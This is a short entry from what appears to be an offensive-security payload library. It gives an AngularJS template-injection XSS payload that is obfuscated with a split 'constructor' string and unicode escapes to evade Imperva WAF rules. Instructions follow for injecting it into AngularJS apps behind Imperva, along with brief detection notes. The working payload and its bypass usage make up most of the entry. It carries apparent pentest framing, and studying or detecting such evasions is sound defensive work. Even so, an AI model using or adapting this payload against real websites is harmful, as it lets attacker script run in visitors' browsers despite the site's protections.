---
id: 6359c99d-695e-42a2-8f19-1fd39b415d4f
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.715864+00:00'
updated_at: '2023-04-10T20:24:52.691430+00:00'
tags:
  - xss
  - angularjs
  - payload
  - waf-bypass
  - imperva
platforms:
  - Web
validated: true
---

# AngularJS-Imperva-WAF-Bypass-Payload

## Code

```javascript
{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\u{6f}mpt(d\u{6f}cument.d\u{6f}main)')()}}
```

## Description

This payload splits 'constructor' into array parts, joins them, and uses unicode escapes (\u{6f} for 'o') to build 'prompt(document.domain)', specifically designed to bypass Imperva WAF rules that scan for direct constructor or prompt strings.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (None) | Array x is hardcoded; unicode escapes are fixed for the prompt string. | N/A |

## Usage

Target AngularJS apps behind Imperva; inject into template expressions to execute despite WAF protection, useful for confirming bypass in pentests.

## Detection

- Imperva logs for unicode-escaped prompts or array.join on 'constr'/'uctor'.
- CSP or script monitoring for getOwnPropertyDescriptor on empty objects.
- Behavioral: unexpected prompts in protected apps.

## Related

- [[procedures/Advanced-XSS-Bypass-in-Angular-and-AngularJS]]
